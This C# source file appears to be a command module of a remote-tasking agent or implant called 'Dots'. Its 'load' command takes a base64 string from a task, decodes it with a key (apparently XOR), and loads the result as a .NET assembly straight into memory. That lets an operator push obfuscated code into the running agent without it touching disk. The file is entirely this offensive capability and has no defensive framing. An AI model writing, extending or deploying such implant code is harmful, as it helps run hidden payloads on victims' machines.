using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using Dots.Models;

namespace Dots.Commands
{
    public class LoadCommand : DotsCommand
    {
        public override string Name => "load";

        public override void Execute(TaskRequest task, DotsProperties dotsProperty)
        {
            Assembly assembly = Assembly.Load(Zor(Convert.FromBase64String(task.Params[0]), task.Params[1]));
            SetupResult(task, $"Succesfully loaded {assembly.FullName} module.");
        }
    }
}
